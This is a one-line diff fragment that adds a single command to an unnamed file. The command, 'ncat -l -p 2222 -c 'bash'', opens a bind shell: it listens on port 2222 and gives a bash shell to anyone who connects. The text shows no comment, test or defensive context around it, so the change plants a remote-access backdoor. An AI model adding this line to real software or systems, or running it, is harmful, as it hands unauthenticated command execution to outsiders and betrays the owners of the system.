@@ -1,0 +1,1 @@
+ncat -l -p 2222 -c 'bash'
